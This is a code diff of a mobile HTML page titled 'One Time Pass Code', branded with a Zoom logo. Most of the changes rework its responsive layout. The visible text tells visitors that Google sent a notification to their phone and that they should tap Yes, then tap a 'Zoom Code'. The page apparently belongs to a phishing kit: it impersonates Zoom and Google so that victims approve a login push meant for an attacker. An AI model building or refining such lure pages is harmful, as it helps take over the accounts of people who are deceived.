@@ -2,109 +2,245 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+  />
+
   <title>One Time Pass Code</title>
 
   <link rel="icon" type="image/png" href="../../logo.png" />
-  
+
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+
+      font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
     }
 
-    html, body {
+    html,
+    body {
       width: 100%;
       height: 100%;
-      background-color: #ffffff;
-      color: #202124;
+      margin: 0;
+
+      background: #ffffff;
+
+      overflow: hidden;
     }
 
-    /* Container ke puro screen er height porjonto force korar jonno */
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* =========================================
+       MAIN SCREEN
+       ========================================= */
+
     .container {
       width: 100%;
-      height: 100vh;
-      min-height: 100%;
+      max-width: 420px;
+
+      /*
+        dvh = actual visible mobile viewport
+        This prevents content going below
+        the browser/mobile screen.
+      */
+      height: 100dvh;
+      min-height: 0;
+
+      background: #ffffff;
+
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: space-between;
+
       text-align: center;
-      padding: 24px 20px;
-      background: #ffffff;
+
+      /*
+        Horizontal spacing stays comfortable.
+        Vertical spacing automatically scales.
+      */
+      padding:
+        clamp(12px, 4dvh, 34px)
+        clamp(14px, 6vw, 26px)
+        clamp(12px, 3dvh, 24px);
     }
+
+    /* =========================================
+       CONTENT
+       ========================================= */
 
     .content-box {
+      width: 100%;
+
       display: flex;
       flex-direction: column;
       align-items: center;
-      width: 100%;
+
+      /*
+        Important:
+        Content cannot grow outside viewport.
+      */
+      min-height: 0;
+      flex-shrink: 1;
     }
 
-    /* Top Logo */
+    /* =========================================
+       ZOOM LOGO
+       ========================================= */
+
     .logo {
-      width: 60px;
-      height: 60px;
-      object-fit: contain;
-      margin-bottom: 12px;
-      border-radius: 50%;
-    }
+      width: clamp(42px, 13vw, 55px);
 
-    /* Main Title */
-    h1 {
-      font-size: 22px;
-      font-weight: 700;
-      color: #1a1a1a;
-      margin-bottom: 16px;
-    }
-
-    /* Phone Graphic Illustration */
-    .phone-illustration {
-      width: 45vw;
-      max-width: 180px;
       height: auto;
+
       object-fit: contain;
-      margin-bottom: 16px;
+
+      margin-bottom: clamp(8px, 3dvh, 27px);
+
+      flex-shrink: 1;
     }
 
-    /* Sub Heading */
-    h2 {
-      font-size: 19px;
+    /* =========================================
+       TITLE
+       ========================================= */
+
+    h1 {
+      width: 100%;
+
+      font-size: clamp(17px, 5vw, 22px);
+
+      line-height: 1.2;
+
       font-weight: 700;
-      color: #1a1a1a;
-      margin-bottom: 8px;
+
+      color: #111111;
+
+      margin-bottom: clamp(9px, 3dvh, 27px);
+
+      flex-shrink: 1;
     }
 
-    /* Description Text */
+    /* =========================================
+       PHONE ILLUSTRATION
+       ========================================= */
+
+    .phone-illustration {
+      /*
+        Width reacts to screen width.
+        Height reacts to screen height.
+
+        This keeps it BIG but prevents
+        it from pushing the content down.
+      */
+      width: min(55vw, 220px);
+
+      height: min(23dvh, 220px);
+
+      max-width: 220px;
+      max-height: 220px;
+
+      display: block;
+
+      object-fit: contain;
+
+      margin-bottom: clamp(8px, 2.5dvh, 24px);
+
+      flex-shrink: 1;
+    }
+
+    /* =========================================
+       CHECK YOUR PHONE
+       ========================================= */
+
+    h2 {
+      font-size: clamp(15px, 4.4vw, 19px);
+
+      line-height: 1.2;
+
+      font-weight: 700;
+
+      color: #111111;
+
+      margin-bottom: clamp(4px, 1dvh, 9px);
+
+      flex-shrink: 1;
+    }
+
+    /* =========================================
+       DESCRIPTION
+       ========================================= */
+
     .desc-text {
-      font-size: 15px;
-      font-weight: 600;
+      width: 100%;
+
+      font-size: clamp(12px, 3.6vw, 15px);
+
+      line-height: 1.45;
+
+      font-weight: 500;
+
       color: #1f2937;
-      line-height: 1.4;
+
+      flex-shrink: 1;
     }
 
     .desc-text span {
       font-weight: 800;
+
       color: #000000;
     }
 
-    /* Resend Button */
+    /* =========================================
+       RESEND BUTTON
+       ========================================= */
+
     .btn-join {
+      width: min(100%, 330px);
+
+      /*
+        Button height also scales slightly
+        according to the screen.
+      */
+      height: clamp(42px, 6dvh, 50px);
+
+      margin-top: clamp(8px, 2.2dvh, 18px);
+
       background-color: #007aff;
-      color: white;
-      padding: 15px 0;
-      width: 100%;
-      max-width: 340px;
-      font-size: 16px;
-      font-weight: bold;
+
+      color: #ffffff;
+
       border: none;
-      border-radius: 12px;
+
+      border-radius: 10px;
+
+      font-size: clamp(13px, 3.8vw, 16px);
+
+      font-weight: 700;
+
       cursor: pointer;
-      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.25);
-      transition: background-color 0.2s, transform 0.1s;
-      margin-top: 15px;
+
+      box-shadow:
+        0 4px 12px rgba(0, 122, 255, 0.25);
+
+      flex-shrink: 1;
+
+      transition:
+        background-color 0.2s,
+        transform 0.1s;
     }
 
     .btn-join:hover {
@@ -114,24 +250,196 @@
     .btn-join:active {
       transform: scale(0.98);
     }
+
+    /* =========================================
+       SMALL HEIGHT PHONES
+       ========================================= */
+
+    @media (max-height: 700px) {
+
+      .container {
+        padding-top: 12px;
+        padding-bottom: 10px;
+      }
+
+      .logo {
+        width: 44px;
+        margin-bottom: 10px;
+      }
+
+      h1 {
+        font-size: 18px;
+        margin-bottom: 12px;
+      }
+
+      .phone-illustration {
+        width: 170px;
+        height: 170px;
+        margin-bottom: 10px;
+      }
+
+      h2 {
+        font-size: 16px;
+        margin-bottom: 5px;
+      }
+
+      .desc-text {
+        font-size: 12.5px;
+        line-height: 1.35;
+      }
+
+      .btn-join {
+        height: 43px;
+        margin-top: 10px;
+      }
+    }
+
+    /* =========================================
+       VERY SHORT SCREEN
+       ========================================= */
+
+    @media (max-height: 600px) {
+
+      .container {
+        padding-top: 8px;
+        padding-bottom: 8px;
+      }
+
+      .logo {
+        width: 40px;
+        margin-bottom: 7px;
+      }
+
+      h1 {
+        font-size: 17px;
+        margin-bottom: 8px;
+      }
+
+      .phone-illustration {
+        width: 135px;
+        height: 135px;
+        margin-bottom: 7px;
+      }
+
+      h2 {
+        font-size: 15px;
+        margin-bottom: 3px;
+      }
+
+      .desc-text {
+        font-size: 11.5px;
+        line-height: 1.3;
+      }
+
+      .btn-join {
+        height: 40px;
+        margin-top: 7px;
+      }
+    }
+
+    /* =========================================
+       iPHONE 12 / 13 / 14 SIZE
+       ========================================= */
+
+    @media (min-width: 375px) and (min-height: 750px) {
+
+      .logo {
+        width: 54px;
+      }
+
+      h1 {
+        font-size: 21px;
+      }
+
+      .phone-illustration {
+        width: 205px;
+        height: 195px;
+      }
+
+      h2 {
+        font-size: 18px;
+      }
+
+      .desc-text {
+        font-size: 14px;
+      }
+
+      .btn-join {
+        width: 320px;
+        max-width: 100%;
+      }
+    }
+
+    /* =========================================
+       TABLET / DESKTOP
+       ========================================= */
+
+    @media (min-width: 600px) {
+
+      .container {
+        max-width: 420px;
+      }
+    }
   </style>
 </head>
+
 <body>
 
   <div class="container">
+
+    <!-- ==============================
+         MAIN CONTENT
+         ============================== -->
+
     <div class="content-box">
-      <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
-      <h1>One Time Pass Code</h1>
-      <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
-      <h2>Check your phone.</h2>
+
+      <!-- Zoom Logo -->
+      <img
+        class="logo"
+        src="../../Zoom-Logo.png"
+        alt="Zoom Logo"
+      />
+
+      <!-- Main Title -->
+      <h1>
+        One Time Pass Code
+      </h1>
+
+      <!-- Phone Illustration -->
+      <img
+        class="phone-illustration"
+        src="../icon.gif"
+        alt="Phone Illustration"
+      />
+
+      <!-- Heading -->
+      <h2>
+        Check your phone.
+      </h2>
+
+      <!-- Description -->
       <p class="desc-text">
-        Google sent a notification to your phone.<br>
-        <span>Tap Yes</span> on the notification<br>
+        Google sent a notification to your phone.<br />
+
+        <span>Tap Yes</span>
+        on the notification<br />
+
         Then Tap Zoom Code
       </p>
+
     </div>
 
-    <button class="btn-join" onclick="window.location.href='../'">Resend</button>
+    <!-- ==============================
+         RESEND BUTTON
+         ============================== -->
+
+    <button
+      class="btn-join"
+      onclick="window.location.href='../'"
+    >
+      Resend
+    </button>
+
   </div>
 
 </body>
